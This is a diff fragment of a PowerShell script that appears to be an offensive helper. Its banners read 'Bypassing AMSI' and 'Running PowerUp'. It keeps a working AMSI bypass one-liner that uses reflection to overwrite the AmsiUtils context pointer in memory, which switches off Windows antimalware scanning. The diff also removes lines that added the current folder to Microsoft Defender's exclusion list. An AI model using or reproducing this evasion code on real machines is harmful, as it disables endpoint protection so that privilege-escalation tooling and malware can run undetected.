@@ -5,13 +5,6 @@ Write-Host '## Bypassing AMSI      ##' -BackgroundColor Black
 Write-Host '#########################' -BackgroundColor Black
 $a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like "*Context") {$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf = @(0);[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)
 
-#### Add Exclusion (Defender)
-Write-Host '####################################################' -BackgroundColor Black
-Write-Host '## Add current folder to defender exclusions      ##' -BackgroundColor Black
-Write-Host '####################################################' -BackgroundColor Black
-Write-Host 'Adding the current folder to the defender exclusion list' -ForegroundColor Black -BackgroundColor White
-$currentPath=(Get-Location).Path
-Add-MpPreference -ExclusionPath $currentPath
 
 Write-Host '#########################' -BackgroundColor Black
 Write-Host '## Running PowerUp      ##' -BackgroundColor Black
